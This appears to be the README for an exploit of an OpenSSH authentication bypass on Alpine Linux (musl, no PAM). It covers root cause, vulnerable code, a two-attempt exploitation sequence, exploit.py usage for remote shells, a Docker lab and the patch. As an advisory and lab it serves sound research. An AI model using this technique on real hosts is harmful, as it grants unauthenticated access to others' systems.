# CVE-2026-123158: OpenSSH Auth Bypass

Authentication bypass on Alpine Linux (musl libc, no PAM). Allows unauthenticated remote access to any account with a `*` hash in `/etc/shadow`.

## Root Cause

Two bugs chain together.

musl libc (< 1.2.5-r4) returns the error sentinel `"*"` from `crypt()` when the password exceeds 256 bytes with a `$5$` or `$6$` salt:

```c
crypt("short", "$6$salt$")    // → "$6$salt$Wq3r..."  (valid hash)
crypt("A" * 300, "$6$salt$")  // → "*"                 (error sentinel)
```

OpenSSH (< 10.6p2, without PAM) stores the target account's shadow hash through a raw pointer into musl's static `getspnam()` buffer. That pointer becomes dangling when `pick_salt()` iterates other accounts through `getspnam()`, overwriting the same buffer.

## Vulnerable Code

### sys_auth_passwd() in auth-passwd.c

```c
int sys_auth_passwd(struct ssh *ssh, const char *password)
{
    struct passwd *pw = authctxt->pw;
    char *encrypted_password, *salt = NULL;

    // pw_password points into musl's static getspnam() buffer
    char *pw_password = authctxt->valid
        ? shadow_pw(pw)       // → getspnam(pw->pw_name)
        : pw->pw_passwd;

    // "*" is 1 char: pw_password[0]='*', pw_password[1]='\0'
    // condition is FALSE → salt stays NULL
    if (pw_password[0] && pw_password[1])
        salt = pw_password;

    // salt=NULL → xcrypt calls pick_salt()
    // pick_salt() may corrupt pw_password via getspnam() buffer reuse
    encrypted_password = xcrypt(password, salt);

    // comparison uses the possibly corrupted pointer
    return encrypted_password != NULL
        && strcmp(encrypted_password, pw_password) == 0;
}
```

### pick_salt() in xcrypt.c

```c
static const char *pick_salt(void)
{
    static char salt[32];

    // second call returns immediately, no getspnam(), no corruption
    if (salt[0] != '\0')
        return salt;

    strlcpy(salt, "xx", sizeof(salt));
    setpwent();
    while ((pw = getpwent()) != NULL) {
        // shadow_pw() calls getspnam()
        // this overwrites the static buffer that pw_password points into
        if ((passwd = shadow_pw(pw)) == NULL)
            continue;
        if (passwd[0] == '$' && (p = strrchr(passwd+1, '$')) != NULL) {
            typelen = p - passwd + 1;
            strlcpy(salt, passwd, MINIMUM(typelen, sizeof(salt)));
            explicit_bzero(passwd, strlen(passwd));
            goto out;
        }
    }
out:
    endpwent();
    return salt;
}
```

## Exploitation

Two password attempts within the same SSH connection. Target account has `*` in `/etc/shadow` (default for Alpine cloud instances).

**First auth** (any short password): `shadow_pw()` loads `"*"` into the static buffer. `salt=NULL` triggers `pick_salt()`, which iterates all accounts via `getspnam()`, caches the `$6$` salt, and corrupts the buffer. `strcmp()` fails because `pw_password` no longer reads `"*"`.

**Second auth** (257+ byte password): `shadow_pw()` reloads `"*"` fresh into the buffer. `salt=NULL` triggers `pick_salt()` again, but this time it returns the cached salt immediately without calling `getspnam()`. No corruption. `crypt("A"*257, "$6$...")` returns `"*"` (musl bug). `strcmp("*", "*") == 0` → bypass.

## Prerequisites

| Condition | Detail |
|-----------|--------|
| musl libc | < 1.2.5-r4 |
| OpenSSH | < 10.6p2, compiled without PAM |
| Target account | `*` hash in `/etc/shadow` (Alpine cloud default) |
| Salt source | At least one other account with a `$6$` hash |

## Usage

```
pip install paramiko
```

Interactive shell:
```
python3 exploit.py <host> <port> <user>
```

Single command:
```
python3 exploit.py <host> <port> <user> -c "id"
```

## Lab

```dockerfile
FROM alpine:3.20 AS builder
RUN apk add --no-cache build-base openssl-dev zlib-dev linux-headers
ADD https://cdn.openbsd.org/pub/OpenBSD/OpenSSH/portable/openssh-9.7p1.tar.gz /tmp/
RUN cd /tmp && tar xzf openssh-9.7p1.tar.gz && \
    cd openssh-9.7p1 && \
    ./configure --prefix=/usr --sysconfdir=/etc/ssh \
        --with-privsep-user=sshd --with-privsep-path=/var/empty \
        --without-pam --with-ssl-engine && \
    make -j$(nproc) && make install DESTDIR=/tmp/openssh-install

FROM alpine:3.20
RUN apk add --no-cache openssl libcrypto3 zlib
COPY --from=builder /tmp/openssh-install/usr /usr
COPY --from=builder /tmp/openssh-install/etc /etc
COPY --from=builder /tmp/openssh-install/var /var
RUN addgroup -S sshd 2>/dev/null || true && \
    adduser -S -G sshd -h /var/empty -s /sbin/nologin sshd 2>/dev/null || true && \
    mkdir -p /var/empty && ssh-keygen -A
RUN adduser -D -s /bin/ash alpine && \
    sed -i 's/^alpine:[^:]*:/alpine:*:/' /etc/shadow
RUN adduser -D testuser && \
    echo "testuser:password123" | chpasswd
RUN echo "PasswordAuthentication yes" >> /etc/ssh/sshd_config && \
    echo "PermitEmptyPasswords no" >> /etc/ssh/sshd_config
EXPOSE 22
CMD ["/usr/sbin/sshd", "-D", "-e"]
```

```
docker build -t sshole-lab .
docker run -d -p 2222:22 sshole-lab
python3 exploit.py 127.0.0.1 2222 alpine -c "id"
```

## Fix

The patch copies `pw_password` with `strdup()` before calling `xcrypt()`, breaking the dependency on the static buffer:

```c
char *pw_password = shadow_pw(pw);
char *saved = xstrdup(pw_password);

encrypted_password = xcrypt(password, salt);

return encrypted_password != NULL
    && strcmp(encrypted_password, saved) == 0;
```

Update musl to >= 1.2.5-r4 or OpenSSH to >= 9.7_p1-r6 (Alpine) / >= 10.6p2.
